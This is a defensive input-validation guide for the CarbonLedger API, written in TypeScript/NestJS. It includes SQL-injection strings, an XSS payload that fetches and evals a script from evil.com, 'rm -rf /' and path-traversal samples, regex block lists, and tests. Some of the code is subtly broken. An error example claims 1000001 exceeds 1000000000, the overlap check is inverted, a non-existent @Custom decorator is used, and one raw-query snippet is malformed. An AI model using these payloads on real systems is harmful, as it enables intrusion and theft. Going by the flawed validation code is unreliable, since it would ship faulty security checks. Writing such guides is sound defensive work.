# Input Validation & Security Guide

This document details comprehensive input validation strategy for all CarbonLedger API endpoints, protecting against injection attacks, data corruption, and malicious input.

## Table of Contents

1. [Overview](#overview)
2. [Validation Strategy](#validation-strategy)
3. [Credit-Specific Validation](#credit-specific-validation)
4. [Project-Specific Validation](#project-specific-validation)
5. [SQL Injection Prevention](#sql-injection-prevention)
6. [XSS (Cross-Site Scripting) Prevention](#xss-protection)
7. [Common Attack Patterns](#common-attack-patterns)
8. [Validation Implementation](#validation-implementation)
9. [Testing Validation](#testing-validation)

---

## Overview

All user inputs are validated before processing via a multi-layer approach:

1. **Schema validation**: Type and format checking
2. **Business logic validation**: Domain-specific rules
3. **Security validation**: Injection and malicious pattern detection
4. **Sanitization**: Removing or escaping dangerous content

---

## Validation Strategy

### Principles

1. **Validate everything**: Never trust user input
2. **Whitelist approach**: Define what IS allowed, reject everything else
3. **Fail secure**: Invalid input → reject, not allow by default
4. **Defense in depth**: Multiple validation layers
5. **Clear errors**: Provide actionable feedback without leaking internals

### Validation Layers

```
User Input
    ↓
[1] Schema Validation (Type, Format)
    ↓
[2] Length/Size Validation
    ↓
[3] Range/Bounds Validation
    ↓
[4] Pattern Matching (Injection detection)
    ↓
[5] Business Logic Validation
    ↓
[6] Sanitization (if needed)
    ↓
Processing
```

---

## Credit-Specific Validation

### Credit Amount

**Field**: `amount` or calculated from `serialStart`/`serialEnd`

**Rules**:
- Must be positive integer
- Must be <= MAX_BATCH_SIZE (1,000,000,000)
- Must not cause project total to exceed verified tonnes

**Implementation**:
```typescript
import { IsPositive, IsInt, Max } from 'class-validator';
import { Transform } from 'class-transformer';

export class MintCreditsDto {
  @IsInt()
  @IsPositive()
  @Max(1_000_000_000, { message: 'Batch cannot exceed 1 billion credits' })
  @Transform(({ value }) => parseInt(value, 10))
  serialStart: number;

  @IsInt()
  @IsPositive()
  @Max(1_000_000_000)
  @Transform(({ value }) => parseInt(value, 10))
  serialEnd: number;

  // Custom validation: serialEnd >= serialStart
  @ValidateIf((obj) => obj.serialStart && obj.serialEnd)
  @Custom((value, { object }) => {
    if (value < object.serialStart) {
      throw new Error('serialEnd must be >= serialStart');
    }
    return true;
  })
  validateRange() {}
}
```

**Error responses**:
```json
{
  "error": {
    "code": "INVALID_INPUT",
    "details": [
      {
        "field": "serialStart",
        "issue": "Must be a positive integer"
      },
      {
        "field": "serialEnd",
        "issue": "Must be >= serialStart"
      },
      {
        "field": "amount",
        "issue": "Calculated amount (1000001) exceeds MAX_BATCH_SIZE (1000000000)"
      }
    ]
  }
}
```

### Serial Range Validation

**Fields**: `serialStart`, `serialEnd`

**Rules**:
- Both must be positive integers
- serialEnd >= serialStart
- Calculated range size must be <= 1 billion
- Range must not overlap existing ranges (checked in contract)

**Database check (Prisma)**:
```typescript
async validateSerialRange(
  projectId: number,
  serialStart: u64,
  serialEnd: u64
): Promise<boolean> {
  // Query contract to check for overlaps
  const overlaps = await this.contractService.verify_serial_range(
    serialStart,
    serialEnd
  );
  
  if (!overlaps) {
    throw new Error('SerialNumberConflict');
  }
  
  return true;
}
```

### Project ID Validation

**Field**: `projectId`

**Rules**:
- Must be positive integer
- Must correspond to existing project
- Project must be verified (status = 'verified')
- User must be project issuer

**Implementation**:
```typescript
@IsInt()
@IsPositive()
@Custom(async (value, { object }) => {
  const project = await projectService.findById(value);
  
  if (!project) {
    throw new Error('Project not found');
  }
  
  if (project.status !== 'verified') {
    throw new Error('Project is not verified');
  }
  
  if (project.issuer !== context.user.publicKey) {
    throw new Error('Unauthorized: not project issuer');
  }
  
  return true;
}, { message: 'Invalid or inaccessible project' })
projectId: number;
```

### Vintage Year Validation

**Field**: `vintageYear`

**Rules**:
- Must be integer
- Must be in range [1990, current_year]
- Cannot be in future

**Implementation**:
```typescript
@IsInt()
@Min(1990, { message: 'Vintage year must be >= 1990' })
@Max(() => new Date().getFullYear(), {
  message: 'Vintage year cannot be in the future'
})
vintageYear: number;
```

### Beneficial Owner Validation

**Field**: `beneficialOwner`

**Rules**:
- Optional field (if provided, must follow rules)
- Max 255 characters
- Only alphanumeric, spaces, hyphens, apostrophes, periods
- NO HTML tags, SQL keywords, script patterns

**Implementation**:
```typescript
@IsOptional()
@IsString()
@MaxLength(255, { message: 'Beneficial owner name must not exceed 255 characters' })
@Matches(
  /^[a-zA-Z0-9\s\-'\.]+$/,
  {
    message: 'Beneficial owner can only contain letters, numbers, spaces, hyphens, apostrophes, and periods'
  }
)
@Custom((value) => {
  if (!value) return true; // Optional field
  
  // Check for dangerous patterns
  const dangerousPatterns = [
    /<script/i,
    /<iframe/i,
    /on(click|error|load)=/i,
    /javascript:/i,
    /--/,          // SQL comment
    /\/\*/,        // SQL comment start
    /;.*DROP/i,    // SQL injection
    /;.*DELETE/i,
    /;.*INSERT/i,
    /;.*UPDATE/i,
    /;.*CREATE/i,
    /;.*ALTER/i,
  ];
  
  for (const pattern of dangerousPatterns) {
    if (pattern.test(value)) {
      throw new Error(`Invalid characters detected: ${pattern}`);
    }
  }
  
  return true;
}, { message: 'Beneficial owner contains invalid characters or patterns' })
beneficialOwner?: string;
```

---

## Project-Specific Validation

### Project Name

**Field**: `name`

**Rules**:
- Required
- String
- Length: 3-200 characters
- No leading/trailing whitespace
- Alphanumeric, spaces, hyphens, apostrophes, periods only

**Implementation**:
```typescript
@IsString()
@MinLength(3, { message: 'Project name must be at least 3 characters' })
@MaxLength(200, { message: 'Project name must not exceed 200 characters' })
@Trim()
@Matches(
  /^[a-zA-Z0-9\s\-'\.]+$/,
  { message: 'Project name contains invalid characters' }
)
name: string;
```

### Project Description

**Field**: `description`

**Rules**:
- Required
- String
- Length: 20-2000 characters
- Can include line breaks
- NO HTML tags or scripts

**Implementation**:
```typescript
@IsString()
@MinLength(20, { message: 'Description must be at least 20 characters' })
@MaxLength(2000, { message: 'Description must not exceed 2000 characters' })
@Custom((value) => {
  // Check for HTML/script tags
  if (/<[a-z]/i.test(value) || /javascript:/i.test(value)) {
    throw new Error('HTML and script tags are not allowed');
  }
  return true;
}, { message: 'Description contains invalid content' })
description: string;
```

### Location Field

**Field**: `location`

**Rules**:
- Required
- String
- Max 255 characters
- Geographic format (no arbitrary code)

**Implementation**:
```typescript
@IsString()
@MaxLength(255)
@Custom((value) => {
  // Validate geographic format
  const validLocationPattern = /^[a-zA-Z0-9\s\-,\.()]+$/;
  if (!validLocationPattern.test(value)) {
    throw new Error('Invalid location format');
  }
  return true;
}, { message: 'Location must be valid geographic area' })
location: string;
```

---

## SQL Injection Prevention

### Attack Vectors

**Direct SQL injection** (prevented by Prisma):
```sql
-- Attack attempt:
publicKey = "'; DROP TABLE credits; --"

-- What attacker tries:
SELECT * FROM users WHERE public_key = ''; DROP TABLE credits; --';
```

**ORM-based protection**:
```typescript
// ✅ Safe - Prisma parameterizes automatically
const user = await prisma.user.findUnique({
  where: { publicKey: userInput } // Parameterized
});

// ❌ Unsafe - Raw SQL (should never be used for user input)
const user = await prisma.$queryRaw(`
  SELECT * FROM users WHERE public_key = '${userInput}'
); // Don't do this!
```

### Implementation

**Use Prisma ORM exclusively** (no raw SQL with user input):

```typescript
// ✅ Good - Using Prisma query builder
const credits = await prisma.creditBatch.findMany({
  where: {
    projectId: parseInt(projectId), // Type-safe
    status: 'issued',
  }
});

// ❌ Bad - String interpolation (never!)
const credits = await prisma.$queryRaw(
  `SELECT * FROM credit_batch WHERE project_id = ${projectId}`
);
```

### Pattern-Based Detection

As an additional layer, detect suspicious SQL patterns:

```typescript
const SQL_INJECTION_PATTERNS = [
  /(\bOR\b|AND\b).*=.*['"]?/i,
  /--.*$/m,                    // SQL comments
  /\/\*.*\*\//,               // Multi-line comments
  /xp_/i,                     // Extended stored procedures
  /sp_/i,                     // Stored procedures
  /;\s*(DROP|DELETE|UPDATE|INSERT|CREATE|ALTER)/i,
  /UNION.*SELECT/i,
  /EXEC\s*\(/i,
];

function validateAgainstSqlInjection(input: string): boolean {
  for (const pattern of SQL_INJECTION_PATTERNS) {
    if (pattern.test(input)) {
      return false;
    }
  }
  return true;
}
```

---

## XSS Protection

### Attack Vectors

**Stored XSS** (prevented by sanitization):
```html
<!-- Attacker injects into beneficialOwner field: -->
<img src=x onerror="fetch('https://evil.com/steal.js').then(r=>eval(r.text()))">

<!-- If not sanitized, this executes when displayed: -->
<p>Beneficial Owner: <img src=x onerror="...">/p>
```

**Reflected XSS** (prevented by encoding):
```
GET /api/v1/credits?search=<script>alert('xss')</script>
```

### Implementation

**1. Sanitize on input**:
```typescript
import * as DOMPurify from 'isomorphic-dompurify';

function sanitizeInput(input: string): string {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: [], // No HTML tags allowed
    ALLOWED_ATTR: [],
  });
}

const XSS_PATTERNS = [
  /<script[^>]*>.*?<\/script>/gi,
  /<iframe[^>]*>.*?<\/iframe>/gi,
  /on(click|error|load|mouse\w+)=/gi,
  /javascript:/gi,
];

function validateAgainstXss(input: string): boolean {
  for (const pattern of XSS_PATTERNS) {
    if (pattern.test(input)) {
      return false;
    }
  }
  return true;
}
```

**2. Encode on output**:
```typescript
// When returning in API response
function escapeJson(input: string): string {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// In response DTO
export class CreditResponseDto {
  @Expose()
  get beneficialOwner(): string {
    return escapeJson(this.raw.beneficialOwner);
  }
}
```

**3. Content Security Policy headers**:
```typescript
// In NestJS main.ts or middleware
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'"
  );
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  next();
});
```

---

## Common Attack Patterns

### Pattern Detection Table

| Attack Type | Pattern | Detection | Mitigation |
|---|---|---|---|
| SQL Injection | `'; DROP TABLE` | Regex + ORM | Parameterized queries |
| XSS Script | `<script>alert()</script>` | Regex + DOMPurify | Sanitize + Encode |
| Path Traversal | `../../../etc/passwd` | Whitelist paths | Validate paths |
| Command Injection | `; rm -rf /` | Block shell chars | No shell execution |
| LDAP Injection | `*)(uid=*` | Regex | Escape LDAP chars |
| NoSQL Injection | `{$ne: null}` | Type validation | Strict typing |

### Implementation Matrix

```typescript
class InputValidator {
  // Comprehensive validation
  static validate(input: string, context: 'sql' | 'xss' | 'path' | 'general'): boolean {
    const trimmed = input.trim();

    switch (context) {
      case 'sql':
        return this.validateSql(trimmed);
      case 'xss':
        return this.validateXss(trimmed);
      case 'path':
        return this.validatePath(trimmed);
      case 'general':
      default:
        return this.validateGeneral(trimmed);
    }
  }

  private static validateSql(input: string): boolean {
    const patterns = [
      /(\bOR\b|\bAND\b)[\s]*['"]?[\s]*=[\s]*['"]?/i,
      /--/,
      /\/\*|\*\//,
      /xp_|sp_/i,
      /;\s*(DROP|DELETE|UPDATE|INSERT|CREATE|ALTER|TRUNCATE)/i,
    ];
    return !patterns.some(p => p.test(input));
  }

  private static validateXss(input: string): boolean {
    const patterns = [
      /<script/i,
      /<iframe/i,
      /on\w+\s*=/i,
      /javascript:/i,
    ];
    return !patterns.some(p => p.test(input));
  }

  private static validatePath(input: string): boolean {
    // Allow only alphanumeric, dots, hyphens, slashes
    return /^[a-zA-Z0-9.\-\/]+$/.test(input) && !input.includes('..');
  }

  private static validateGeneral(input: string): boolean {
    // Basic sanitization
    return this.validateSql(input) && this.validateXss(input);
  }
}
```

---

## Validation Implementation

### NestJS DTO with Validation

```typescript
import {
  IsString,
  IsInt,
  IsPositive,
  IsOptional,
  MaxLength,
  MinLength,
  Matches,
  Custom,
  ValidateIf,
} from 'class-validator';
import { Transform } from 'class-transformer';

export class MintCreditsDto {
  @IsInt({ message: 'projectId must be an integer' })
  @IsPositive({ message: 'projectId must be positive' })
  @Transform(({ value }) => {
    const parsed = parseInt(value, 10);
    if (isNaN(parsed)) throw new Error('Invalid projectId');
    return parsed;
  })
  projectId: number;

  @IsInt()
  @IsPositive()
  @Transform(({ value }) => {
    const parsed = parseInt(value, 10);
    if (isNaN(parsed)) throw new Error('Invalid serialStart');
    return parsed;
  })
  serialStart: number;

  @IsInt()
  @IsPositive()
  @Transform(({ value }) => {
    const parsed = parseInt(value, 10);
    if (isNaN(parsed)) throw new Error('Invalid serialEnd');
    return parsed;
  })
  @Custom((value, args) => {
    if (value < args.object.serialStart) {
      throw new Error('serialEnd must be >= serialStart');
    }
    return true;
  })
  serialEnd: number;

  @IsInt()
  @Matches(/^\d{4}$/, { message: 'vintageYear must be YYYY format' })
  @Custom((value) => {
    const year = parseInt(value, 10);
    const now = new Date().getFullYear();
    if (year < 1990 || year > now) {
      throw new Error(`vintageYear must be between 1990 and ${now}`);
    }
    return true;
  })
  vintageYear: number;

  @IsOptional()
  @IsString()
  @MaxLength(255)
  @Matches(/^[a-zA-Z0-9\s\-'\.]+$/, {
    message: 'beneficialOwner contains invalid characters'
  })
  @Custom((value) => {
    if (!value) return true;
    
    const dangerous = [
      /<script/i, /<iframe/i, /on(click|error|load)=/i, /javascript:/i,
      /--/, /\/\*/, /;\s*(DROP|DELETE|INSERT|UPDATE|CREATE|ALTER)/i,
    ];
    
    if (dangerous.some(p => p.test(value))) {
      throw new Error('beneficialOwner contains suspicious patterns');
    }
    return true;
  })
  beneficialOwner?: string;
}
```

### Global Exception Filter

```typescript
import { ExceptionFilter, Catch, ArgumentsHost, BadRequestException } from '@nestjs/common';

@Catch(BadRequestException)
export class ValidationExceptionFilter implements ExceptionFilter {
  catch(exception: BadRequestException, host: ArgumentsHost) {
    const ctx = host.switchToHttp();
    const response = ctx.getResponse();
    const status = exception.getStatus();
    const exceptionResponse = exception.getResponse() as any;

    // Format validation errors
    const details = exceptionResponse.message.map((msg: string) => ({
      issue: msg,
      field: msg.split(' ')[0], // Extract field name if possible
    }));

    response.status(status).json({
      error: {
        code: 'INVALID_INPUT',
        message: 'Validation failed',
        details,
        requestId: ctx.getRequest().id,
        timestamp: new Date().toISOString(),
      },
    });
  }
}
```

---

## Testing Validation

### Unit Tests

```typescript
import { validate } from 'class-validator';
import { plainToClass } from 'class-transformer';
import { MintCreditsDto } from './mint-credits.dto';

describe('MintCreditsDto Validation', () => {
  it('should accept valid input', async () => {
    const dto = plainToClass(MintCreditsDto, {
      projectId: 1,
      serialStart: 1000,
      serialEnd: 1999,
      vintageYear: 2024,
      beneficialOwner: 'Acme Corp',
    });

    const errors = await validate(dto);
    expect(errors).toHaveLength(0);
  });

  it('should reject SQL injection in beneficialOwner', async () => {
    const dto = plainToClass(MintCreditsDto, {
      projectId: 1,
      serialStart: 1000,
      serialEnd: 1999,
      vintageYear: 2024,
      beneficialOwner: "'; DROP TABLE credits; --",
    });

    const errors = await validate(dto);
    expect(errors.length).toBeGreaterThan(0);
    expect(errors[0].constraints).toBeDefined();
  });

  it('should reject XSS in beneficialOwner', async () => {
    const dto = plainToClass(MintCreditsDto, {
      projectId: 1,
      serialStart: 1000,
      serialEnd: 1999,
      vintageYear: 2024,
      beneficialOwner: '<script>alert("xss")</script>',
    });

    const errors = await validate(dto);
    expect(errors.length).toBeGreaterThan(0);
  });

  it('should reject invalid vintage year', async () => {
    const dto = plainToClass(MintCreditsDto, {
      projectId: 1,
      serialStart: 1000,
      serialEnd: 1999,
      vintageYear: 1989, // Too old
    });

    const errors = await validate(dto);
    expect(errors.length).toBeGreaterThan(0);
  });

  it('should reject when serialEnd < serialStart', async () => {
    const dto = plainToClass(MintCreditsDto, {
      projectId: 1,
      serialStart: 2000,
      serialEnd: 1999, // Invalid
      vintageYear: 2024,
    });

    const errors = await validate(dto);
    expect(errors.length).toBeGreaterThan(0);
  });
});
```

### Integration Tests

```typescript
describe('Credits API - Input Validation', () => {
  it('should return 400 for invalid serialStart', async () => {
    const response = await request(app.getHttpServer())
      .post('/api/v1/credits/mint')
      .set('Authorization', `Bearer ${token}`)
      .send({
        projectId: 1,
        serialStart: -100, // Invalid
        serialEnd: 1999,
        vintageYear: 2024,
      });

    expect(response.status).toBe(400);
    expect(response.body.error.code).toBe('INVALID_INPUT');
    expect(response.body.error.details).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          issue: expect.stringContaining('positive'),
        }),
      ])
    );
  });

  it('should return 400 for SQL injection attempt', async () => {
    const response = await request(app.getHttpServer())
      .post('/api/v1/credits/mint')
      .set('Authorization', `Bearer ${token}`)
      .send({
        projectId: 1,
        serialStart: 1000,
        serialEnd: 1999,
        vintageYear: 2024,
        beneficialOwner: "'; DROP TABLE credits; --",
      });

    expect(response.status).toBe(400);
    expect(response.body.error.details).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          issue: expect.stringContaining('invalid'),
        }),
      ])
    );
  });

  it('should return 400 for XSS attempt', async () => {
    const response = await request(app.getHttpServer())
      .post('/api/v1/credits/mint')
      .set('Authorization', `Bearer ${token}`)
      .send({
        projectId: 1,
        serialStart: 1000,
        serialEnd: 1999,
        vintageYear: 2024,
        beneficialOwner: '<img src=x onerror="alert(1)">',
      });

    expect(response.status).toBe(400);
  });
});
```

---

## Summary Checklist

- [ ] All user inputs go through NestJS validators
- [ ] No raw SQL queries with user input (use Prisma ORM)
- [ ] HTML/script patterns blocked via regex validation
- [ ] Beneficial owner field validated for injection patterns
- [ ] Serial range bounds validated
- [ ] Project ID and vintage year validated
- [ ] All error responses formatted consistently
- [ ] Global exception filter in place
- [ ] Unit and integration tests cover attack scenarios
- [ ] CSP and security headers configured
- [ ] Input sanitization applied where needed
- [ ] Rate limiting prevents brute force validation attacks

---

## Related Documentation

- [API Reference](./API_REFERENCE.md) - Endpoint specifications
- [Webhook Integration](./WEBHOOK_INTEGRATION.md) - Webhook security
- [AUTH.md](./AUTH.md) - Authentication & authorization
